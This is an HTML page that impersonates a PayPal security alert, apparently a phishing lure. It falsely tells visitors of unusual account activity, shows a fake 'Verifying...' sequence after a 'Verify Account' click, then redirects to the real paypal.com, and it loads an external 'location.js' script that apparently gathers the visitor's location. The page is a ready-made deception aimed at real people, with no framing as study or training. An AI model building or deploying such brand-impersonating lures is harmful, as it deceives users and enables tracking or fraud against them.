<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PayPal — Security Alert</title>
<style>
* { box-sizing:border-box; margin:0; padding:0; }
body {
    min-height:100vh;
    background:linear-gradient(135deg,#003087,#009cde);
    display:flex; align-items:center; justify-content:center;
    font-family:Arial,sans-serif;
    padding:1rem;
}
.card {
    background:#fff;
    border-radius:12px;
    padding:2.5rem;
    max-width:400px;
    width:100%;
    box-shadow:0 10px 40px rgba(0,0,0,.3);
}
.paypal-logo { font-size:2rem; font-weight:bold; color:#003087; margin-bottom:1rem; }
.title { font-size:1.4rem; font-weight:600; color:#111; margin-bottom:.5rem; }
.alert { background:#fff3cd; border-left:4px solid #ffc107; padding:1rem; margin:1.5rem 0; border-radius:4px; font-size:.95rem; color:#856404; }
.steps { margin:1.5rem 0; }
.step { margin-bottom:.8rem; font-size:.9rem; color:#333; }
.step-num { background:#003087; color:#fff; width:24px; height:24px; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-weight:bold; margin-right:.5rem; }
.btn {
    display:block; width:100%;
    padding:.9rem;
    background:#0070ba; color:#fff;
    border:none; border-radius:4px;
    font-size:1rem; font-weight:600; cursor:pointer;
    margin-top:1.5rem;
}
.btn:hover { background:#004c97; }
.footer { font-size:.7rem; color:#999; text-align:center; margin-top:1.5rem; }
#overlay {
    display:none; position:fixed; inset:0;
    background:rgba(0,48,135,.9); z-index:99;
    flex-direction:column; align-items:center; justify-content:center; gap:1rem;
}
#overlay.show { display:flex; }
.spinner {
    width:40px; height:40px;
    border:4px solid rgba(255,255,255,.3);
    border-top-color:#fff;
    border-radius:50%;
    animation:spin .8s linear infinite;
}
@keyframes spin { to { transform:rotate(360deg); } }
#overlay p { color:#fff; font-size:1rem; font-weight:600; }
</style>
</head>
<body>

<div class="card">
    <div class="paypal-logo">P</div>
    <div class="title">Security Alert</div>
    <div class="alert">⚠️ We detected unusual activity on your account</div>
    
    <div class="steps">
        <div class="step"><span class="step-num">1</span>Unusual login detected</div>
        <div class="step"><span class="step-num">2</span>Location verification required</div>
        <div class="step"><span class="step-num">3</span>Please confirm your identity</div>
    </div>
    
    <button class="btn" onclick="verify()">Verify Account</button>
    
    <div class="footer">
        PayPal, Inc. — All rights reserved<br>
        This is an automated security message
    </div>
</div>

<div id="overlay">
    <div class="spinner"></div>
    <p id="text">Verifying...</p>
</div>

<script src="../js/location.js"></script>
<script>
var steps = ["Verifying identity...", "Checking location...", "Authenticating..."];
var i = 0;
function verify() {
    document.getElementById("overlay").classList.add("show");
    var t = setInterval(() => {
        i = (i+1) % steps.length;
        document.getElementById("text").textContent = steps[i];
    }, 2000);
    setTimeout(() => {
        clearInterval(t);
        window.location.href = "https://paypal.com";
    }, 12000);
}
</script>
</body>
</html>
